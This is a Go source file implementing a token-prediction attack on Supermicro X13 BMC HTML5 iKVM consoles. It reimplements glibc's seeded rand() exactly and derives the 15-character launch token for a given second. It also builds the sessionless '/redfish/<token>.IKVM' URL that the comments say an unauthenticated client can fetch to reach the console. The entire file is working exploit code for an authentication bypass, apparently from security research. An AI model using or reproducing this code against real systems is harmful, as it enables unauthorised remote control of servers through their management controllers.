// Package smckvm reconstructs the predictable, time-seeded launch token that
// Supermicro X13-generation BMCs mint for the HTML5 iKVM console.
//
// The Redfish console launch seeds the C library PRNG with the current wall-clock
// second and draws a 15-character token from a 62-character alphanumeric charset.
// That token is the sole authenticator for the launch -- no cookie, session or
// credential is sent -- so it is a pure function of the launch second and can be
// reconstructed by anyone who can estimate it. Decompile references and charset:
// kb/smc/notes/.
//
// The BMC runs ARM glibc, so this package reimplements glibc's TYPE_3
// random()/rand() exactly; BSD/macOS libc produces a different stream and must not
// be substituted. TestGlibcRandFirst pins glibc's documented srand(1) output and
// TestLiveToken pins a field-observed reconstruction.
package smckvm

// Charset is the 62-character alphabet gen_random() indexes into, recovered from
// libredfish.so .rodata at 0xC211EC.
const Charset = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

// TokenLen is the number of characters the launch handler draws (the loop runs
// 15 times).
const TokenLen = 15

// mod is the gen_random() reduction modulus (len(Charset)).
const mod = uint32(len(Charset))

// glibc TYPE_3 additive-feedback parameters.
const (
	deg    = 31  // number of state words (DEG_3)
	sep    = 3   // feedback separation (SEP_3)
	warmup = 310 // discarded outputs after seeding (10 * DEG_3)
)

// Stream reproduces glibc's TYPE_3 random()/rand() output stream for a given
// seed. It is the same generator glibc's rand(3) uses by default, and is
// architecture-independent given the same seed.
type Stream struct {
	state []uint32
	idx   int
}

// NewStream seeds the generator exactly as glibc's srandom_r/srand does: a
// Park-Miller minimal-standard fill of the first 31 words, three copies to prime
// the feedback taps, then 310 warmup rounds of the additive recurrence.
func NewStream(seed uint32) *Stream {
	if seed == 0 {
		seed = 1 // glibc maps a zero seed to 1
	}
	// Capacity covers the seeded state plus a generous run of outputs; the slice
	// still grows if a caller draws more, so this is only an allocation hint.
	r := make([]uint32, deg+sep, deg+sep+warmup+TokenLen+deg)
	r[0] = seed
	for i := 1; i < deg; i++ {
		// r[i] = (16807 * r[i-1]) % 2147483647, computed the signed-safe way
		// glibc uses to avoid 32-bit overflow.
		hi := int64(r[i-1]) / 127773
		lo := int64(r[i-1]) % 127773
		w := 16807*lo - 2836*hi
		if w < 0 {
			w += 2147483647
		}
		r[i] = uint32(w)
	}
	for i := deg; i < deg+sep; i++ {
		r[i] = r[i-deg]
	}
	s := &Stream{state: r, idx: deg + sep}
	for range warmup {
		s.Next()
	}
	return s
}

// Next returns the next 31-bit rand() output and advances the state.
func (s *Stream) Next() uint32 {
	v := s.state[s.idx-deg] + s.state[s.idx-sep] // mod 2^32 via uint32 wrap
	s.state = append(s.state, v)
	s.idx++
	return v >> 1
}

// Token reconstructs the 15-character iKVM launch token minted when the BMC's
// time(NULL) equalled seed. The console URL is /redfish/<Token>.IKVM.
func Token(seed uint32) string {
	s := NewStream(seed)
	b := make([]byte, TokenLen)
	for i := range b {
		b[i] = Charset[s.Next()%mod]
	}
	return string(b)
}

// TokenPath returns the console URL path for the token minted at seed, i.e.
// "/redfish/<token>.IKVM" -- the sessionless launch URL an unauthenticated
// client GETs to reach the console.
func TokenPath(seed uint32) string {
	return "/redfish/" + Token(seed) + ".IKVM"
}
